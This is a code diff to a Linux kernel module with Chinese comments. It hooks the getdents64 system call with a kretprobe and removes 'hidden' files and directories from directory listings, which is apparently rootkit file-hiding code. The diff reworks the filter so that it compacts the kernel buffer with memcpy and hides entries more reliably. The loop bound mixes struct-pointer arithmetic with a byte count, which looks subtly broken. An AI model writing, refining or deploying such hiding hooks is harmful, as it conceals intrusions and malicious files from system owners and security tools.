@@ -178,7 +178,7 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 	long ret;
 	struct linux_dirent64 __user *dirent;
 	struct linux_dirent64 *kbuf = NULL;
-	struct linux_dirent64 *curr, *prev;
+	struct linux_dirent64 *curr, *write_ptr;
 	int count, new_count;
 	char name[256];
 
@@ -208,10 +208,10 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 		return 0;
 	}
 
-	/* 过滤隐藏的条目 */
+	/* 过滤隐藏的条目 - 使用 write 指针压缩缓冲区 */
 	curr = kbuf;
-	prev = NULL;
-	new_count = count;
+	write_ptr = kbuf;
+	new_count = 0;
 
 	while (curr < kbuf + count) {
 		unsigned short reclen = curr->d_reclen;
@@ -223,12 +223,13 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 		strncpy(name, curr->d_name, sizeof(name) - 1);
 
 		if (is_hidden(name, curr->d_type == DT_DIR)) {
-			new_count -= reclen;
 			hidden_entries_count++;
-			if (prev)
-				prev->d_off = curr->d_off;
 		} else {
-			prev = curr;
+			/* 非隐藏条目，复制到 write 位置 */
+			if (write_ptr != curr)
+				memcpy(write_ptr, curr, reclen);
+			write_ptr = (struct linux_dirent64 *)((char *)write_ptr + reclen);
+			new_count += reclen;
 		}
 
 		curr = (struct linux_dirent64 *)((char *)curr + reclen);
